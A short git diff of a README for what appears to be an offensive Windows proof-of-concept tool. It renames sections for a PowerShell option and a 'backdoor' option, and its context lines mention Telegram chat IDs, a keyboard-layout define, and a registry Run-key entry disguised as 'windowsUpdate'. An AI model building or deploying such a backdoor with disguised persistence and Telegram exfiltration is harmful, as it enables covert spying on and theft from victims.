@@ -16,7 +16,7 @@ $githubScript = '<you_fork/poc.ps1>'
 
 >*To get ChatID: https://stackoverflow.com/questions/32423837/telegram-bot-how-to-get-a-group-chat-id*
 
-## Option 1
+## Option 1 (with powershell)
 
 ```powershell
 > [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
@@ -93,7 +93,7 @@ Decompress the archive and put all in : ```C:\Users\Administrador\AppData\Local\
 #define kbd_es_es
 ```
 
-## Option 2 (Backdoor)
+## Option 2 (with powershell and backdoor)
 
 ```powershell
 > reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /f
